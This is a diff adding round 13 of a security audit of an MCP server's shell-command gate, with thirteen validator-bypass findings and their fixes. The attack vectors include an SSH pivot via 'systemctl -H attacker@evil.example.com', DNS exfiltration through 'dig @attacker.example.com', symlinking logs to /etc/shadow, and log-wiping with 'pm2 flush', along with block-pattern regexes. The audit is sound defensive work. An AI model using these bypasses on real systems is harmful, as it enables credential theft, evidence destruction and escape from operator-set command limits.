@@ -596,3 +596,174 @@ During implementation, the Cowork mount's `Edit` tool was confirmed to silently 
 ---
 
 *End of S65 twelfth-pass findings.*
+
+---
+
+## Round 13 — S65 (v1.11.0 targeted review)
+*2026-04-25 · Model: claude-opus-4-6 · Scope: v1.10.8 + v1.11.0 changes only*
+
+**Summary: 0 CRITICAL, 3 HIGH, 5 MEDIUM, 5 LOW — 13 findings (F-OP-85 through F-OP-97)**
+
+All prior findings F-OP-1 through F-OP-84 closed. Core security model (HARD_BLOCKED_PATTERNS, D10, M7-extended, Unicode normalization, newline injection) unchanged and not re-reviewed.
+
+---
+
+### F-OP-85: `service` validator inspects LAST arg — `service nginx force-reload status` bypasses both layers
+**Severity:** HIGH  
+**Component:** `validateServiceArgs` + RED `service` pattern  
+**Attack vector:** `service nginx force-reload status`; also `service nginx try-restart status`, `service nginx condrestart status`  
+**Why it works:** Validator checks `args[args.length - 1]` (last arg). Last arg is `status` — passes. RED pattern `/\bservice\s+\S+\s+(start|stop|restart|reload|enable|disable)\b/i` anchors immediately after `\S+\s+` — `force-reload` does not match `\breload\b` at that anchor. On Debian/Ubuntu sysvinit-utils, only the FIRST positional arg after the service name is the action.  
+**Fix:** Check `args[1]` (first arg after service name, not last). Reject any extra args. Add `force-reload|try-restart|condrestart|force-stop|force-restart|reload-or-restart` to RED pattern alternation.  
+**Status:** OPEN
+
+---
+
+### F-OP-86: `systemctl -H/--host` enables SSH pivot from validator-approved `status` path
+**Severity:** HIGH  
+**Component:** `validateSystemctlArgs` + RED `systemctl` pattern  
+**Attack vector:** `systemctl status -H attacker@evil.example.com nginx`; also `systemctl status --host=attacker@evil.example.com nginx`, `systemctl status -M container-name nginx`  
+**Why it works:** Validator only checks `args[0]`. `status` is in READ_ONLY — passes. RED pattern requires destructive sub-command immediately after `systemctl\s+`. Per systemctl(1): `-H/--host` executes the operation remotely over SSH; `-M/--machine` pivots into systemd-managed containers.  
+**Fix:** Scan ALL args for `-H`, `--host*`, `-M`, `--machine*` in `validateSystemctlArgs` and reject. Add HARD_BLOCKED_PATTERN for these flags.  
+**Status:** OPEN
+
+---
+
+### F-OP-87: `systemctl show` / `systemctl cat` leak Environment= vars and arbitrary unit files — parity with F-OP-6/7 pm2 env-leak fix
+**Severity:** HIGH  
+**Component:** `validateSystemctlArgs` READ_ONLY set includes `show` and `cat`  
+**Attack vector:** `systemctl show vps-mcp.service`, `systemctl show --property=Environment vps-mcp.service`, `systemctl cat nginx.service`  
+**Why it works:** `validatePm2Args` was patched in F-OP-6/7 to remove `show`/`describe`/`info` because they leak MCP_AUTH_TOKEN. `systemctl show <unit>` dumps all unit properties including `Environment=` lines. `systemctl cat <unit>` reads the unit file from `/etc/systemd/system/` which commonly contains `Environment="MCP_AUTH_TOKEN=..."` or `EnvironmentFile=`. Bypasses `SENSITIVE_FILE_PATTERNS` (only applied in `validatePath`).  
+**Fix:** Remove `show` and `cat` from READ_ONLY. Add HARD_BLOCKED_PATTERN: `/\bsystemctl\s+(show|cat)\b/i` for defense-in-depth.  
+**Status:** OPEN
+
+---
+
+### F-OP-88: Bare `crontab` (zero args) silently wipes user crontab on Debian/Ubuntu
+**Severity:** MEDIUM  
+**Component:** `validateCrontabArgs` — `args.length === 0` branch returns null  
+**Attack vector:** `crontab` (empty args)  
+**Why it works:** `if (args.length === 0 || (args.length === 1 && args[0] === '-l')) return null` allows bare invocation. Per crontab(1): when no `-l/-r/-e` given, reads stdin for new crontab contents. `execFile` inherits stdin; on Vixie cron (Debian/Ubuntu), EOF from stdin installs an empty crontab — silently deleting all scheduled jobs.  
+**Fix:** Drop the `args.length === 0` branch. Only allow `args.length === 1 && args[0] === '-l'`.  
+**Status:** OPEN
+
+---
+
+### F-OP-89: `pm2 reload all` bypasses `ALLOWED_PROCESSES` restriction that gates `restart_process`
+**Severity:** MEDIUM  
+**Component:** `validatePm2Args` — `reload` added to READ_ONLY  
+**Attack vector:** `pm2 reload all` (after AMBER confirmation); `pm2 reload some-unauthorized-app`  
+**Why it works:** Validator only checks `args[0]`. `reload` in READ_ONLY — passes. No check against `ALLOWED_PROCESSES`. `restart_process` calls `validateProcess()` against the allowlist; this path bypasses it. Can restart vps-mcp itself mid-call or reload processes the operator did not authorize.  
+**Fix:** Remove `reload` from READ_ONLY entirely (route through `restart_process`). Or: add ALLOWED_PROCESSES check — reject `all` and any process not in the allowlist.  
+**Status:** OPEN
+
+---
+
+### F-OP-90: `pm2 flush` destroys forensic log evidence — same files `get_recent_errors`/`get_recent_output` depend on
+**Severity:** MEDIUM  
+**Component:** `validatePm2Args` — `flush` in READ_ONLY; audit-log-destruction RED category misses PM2_LOG_DIR  
+**Attack vector:** `pm2 flush` or `pm2 flush vps-mcp`  
+**Why it works:** `pm2 flush` truncates ALL pm2 log files in `PM2_LOG_DIR`. `get_recent_errors`/`get_recent_output` tail those exact files. Audit-log-destruction RED covers `/var/log/*` but not `/root/.pm2/logs/`. After flush, attack evidence in PM2 logs is destroyed; MCP audit log shows only the `pm2 flush` call. `flush` is also mislabeled as read-only — it is a destructive write.  
+**Fix:** Remove `flush` from READ_ONLY. Add HARD_BLOCKED_PATTERN: `{ pattern: /\bpm2\s+flush\b/i, category: 'audit-log-destruction' }`.  
+**Status:** OPEN
+
+---
+
+### F-OP-91: `findPm2Log` uses `path.resolve()` not `fs.realpathSync()` — symlink in PM2_LOG_DIR escapes bounds check
+**Severity:** MEDIUM  
+**Component:** `findPm2Log` bounds check  
+**Attack vector:** Pre-create `/root/.pm2/logs/vps-mcp-out.log` as symlink to `/etc/shadow`. Call `get_recent_output` with `process_name=vps-mcp`. `tail` follows the symlink and returns shadow file contents.  
+**Why it works:** `path.resolve()` normalizes lexically only — does NOT resolve symlinks. Bounds check sees the lexical path inside PM2_LOG_DIR and passes. `tail` follows the symlink transparently. Compare: `validatePath` (line 524) already uses `fs.realpathSync` for exactly this reason.  
+**Fix:** Replace `path.resolve(p)` with `fs.realpathSync(p)` (try/catch returning false on ENOENT) in the `.filter()` bounds check inside `findPm2Log`.  
+**Status:** OPEN
+
+---
+
+### F-OP-92: `dig` allows `@resolver` and AXFR/IXFR; `host`/`nslookup` use `allowAny` — DNS exfiltration channel
+**Severity:** LOW  
+**Component:** `validateDigArgs`; `host`/`nslookup` POSITIVE_ALLOWLIST entries  
+**Attack vector:** `dig @attacker.example.com internal-host.corp.lan` (leaks internal hostnames to attacker resolver); `dig -t AXFR @ns1.target.tld target.tld`; `host -l target.tld 1.2.3.4` (zone transfer — allowAny)  
+**Why it works:** Validator only blocks `-f` and `-b`. `@server`, `-t AXFR`, and `host -l` all pass. `nslookup` and `host` use `allowAny` — no flag restriction at all.  
+**Note:** Subshells are RED-blocked, so `$(whoami).attacker.io` is not exploitable. Static internal hostnames are the risk.  
+**Fix:** Block `@`-prefixed args and AXFR/IXFR types in `validateDigArgs`. Block `host -l`. Replace `allowAny` on `host`/`nslookup` with narrow flag allowlists.  
+**Status:** OPEN
+
+---
+
+### F-OP-93: RED `crontab` pattern misses combined short flags (`-lr`) and long forms (`--remove`) — defense-in-depth gap
+**Severity:** LOW  
+**Component:** RED `crontab` pattern `/\bcrontab\b.*-[eru]\b/`  
+**Attack vector:** `crontab -lr` — RED misses it (no `\b` boundary after `-l` mid-token); validator catches it. Single-layer defense.  
+**Fix:** Tighten validator to exactly `args.length === 1 && args[0] === '-l'` (all other forms rejected). Update RED pattern to catch long forms (`--remove`, `--edit`, `--user`).  
+**Status:** OPEN
+
+---
+
+### F-OP-94: RED `systemctl` pattern misses `set-environment`, `unset-environment`, `link`, `revert`, `switch-root`, `freeze`, `thaw`
+**Severity:** LOW  
+**Component:** RED `systemctl` pattern — fixed enumeration  
+**Attack vector:** `systemctl set-environment FOO=bar`, `systemctl link /tmp/evil.service`, `systemctl freeze nginx`  
+**Why it works:** All blocked by Layer 2 `validateSystemctlArgs` (not in READ_ONLY). But if READ_ONLY is ever widened without updating RED, these verbs would be single-layer only.  
+**Fix:** Extend RED alternation to include missing destructive verbs, or invert to negative-lookahead allowing only known read-only commands.  
+**Status:** OPEN
+
+---
+
+### F-OP-95: `atq` uses `allowAny` — exposes all-user scheduled jobs when MCP runs as root; unrestricted future flags
+**Severity:** LOW  
+**Component:** POSITIVE_ALLOWLIST `atq` entry  
+**Attack vector:** `atq` as root lists at-jobs for ALL system users. `allowAny` admits any future `at`/`atq` flag without review.  
+**Fix:** `'atq': { description: '...', argValidator: allowFlags('-V', '--version', '-q') }`  
+**Status:** OPEN
+
+---
+
+### F-OP-96: `readAuditLog` bypasses `validatePath`/`SENSITIVE_FILE_PATTERNS` — operator misconfiguring `AUDIT_LOG_PATH=/etc/shadow` gets arbitrary file read
+**Severity:** LOW  
+**Component:** `readAuditLog` — intentional validatePath bypass not defended at read-time  
+**Attack vector:** Set `AUDIT_LOG_PATH=/etc/shadow` (passes startup validation). Call `read_audit_log`. Returns shadow file contents.  
+**Why it works:** Startup validation only blocks `/dev/null`, `/dev/zero`, `/tmp/*` etc. Bypass justification (secrets pre-redacted) only holds if the path IS the audit log. No runtime check that path does not match `SENSITIVE_FILE_PATTERNS`.  
+**Fix:** At read-time, check that `fs.realpathSync(logPath)` does not match `SENSITIVE_FILE_PATTERNS`. Alternatively add common sensitive paths to the startup validator.  
+**Status:** OPEN
+
+---
+
+### F-OP-97: `validateAgainstAllowlist` uses naive `split(/\s+/)` while `tokenizeCommand` is shlex-aware — two-parser mismatch
+**Severity:** LOW  
+**Component:** `validateAgainstAllowlist` + exec call in `runApprovedCommand`  
+**Attack vector:** No confirmed exploit today. Future bypass risk: hard-blocked matchers see different argv than what is actually executed.  
+**Why it works:** `validateCommand`/`checkHardBlocked` use shlex-aware `tokenizeCommand`. `validateAgainstAllowlist` and `exec(cmd, args)` use `split(/\s+/)`. Any command with quoted whitespace or unusual spacing is parsed differently by the two layers.  
+**Fix:** Use `tokenizeCommand` as the single parser in both `validateAgainstAllowlist` and the exec path in `runApprovedCommand`. Single source of truth.  
+**Status:** OPEN
+
+---
+
+## Verified Non-Findings (Round 13)
+
+- `processName='../../../etc/passwd'` in findPm2Log: blocked by `validateProcess` array equality. Even if bypassed, `readdirSync` returns bare filenames — `startsWith('../../../etc/passwd-out')` never matches. **Safe.**
+- `service nginx stop status`: RED catches `stop` before `status`. **Safe.**
+- `dig +short TXT $(whoami).attacker.io`: blocked by RED `\$\([^)]*\)` subshell pattern. **Safe.**
+- `systemctl --no-pager status nginx`: `args[0]='--no-pager'` not in READ_ONLY — blocked. **Safe.**
+- `crontab -l -u root`: validator loop hits `-u` in blocked set — blocked. **Safe.**
+- `crontab -` (read from stdin): `args[0]='-'`, not `'-l'` — blocked at last branch. **Safe.**
+- `ALLOWED_PROCESSES=''` (empty env): parseProcessList returns []; all validateProcess calls throw. **Safe.**
+- `pm2 startup` bare: explicit startup branch requires `args[1] === 'show'`. **Safe.**
+- Audit log size DoS: bounded by 10MB rotation in audit.ts. **Safe.**
+
+---
+
+## Fix Priority Order (Round 13)
+
+1. **F-OP-85** (HIGH) — service validator position bug; one-line fix + RED pattern extension
+2. **F-OP-86** (HIGH) — systemctl -H SSH pivot; validator arg scan + HARD_BLOCKED entry
+3. **F-OP-87** (HIGH) — systemctl show/cat env-leak; remove two entries from READ_ONLY + HARD_BLOCKED
+4. **F-OP-88** (MEDIUM) — crontab no-args wipes crontab; drop `args.length === 0` branch
+5. **F-OP-89** (MEDIUM) — pm2 reload bypasses ALLOWED_PROCESSES; remove from READ_ONLY
+6. **F-OP-90** (MEDIUM) — pm2 flush destroys PM2 logs; remove from READ_ONLY + HARD_BLOCKED entry
+7. **F-OP-91** (MEDIUM) — findPm2Log symlink escape; realpathSync in bounds check
+8. **F-OP-92** (LOW) — dig @resolver/AXFR; extend validators for dig/host/nslookup
+9. **F-OP-93** (LOW) — crontab RED pattern misses combined flags; tighten pattern + validator
+10. **F-OP-94** (LOW) — systemctl RED pattern incomplete; extend or invert to negative lookahead
+11. **F-OP-95** (LOW) — atq allowAny; narrow to allowFlags
+12. **F-OP-96** (LOW) — readAuditLog sensitive path bypass; runtime SENSITIVE_FILE_PATTERNS check
+13. **F-OP-97** (LOW) — two-parser mismatch; unify on tokenizeCommand
+
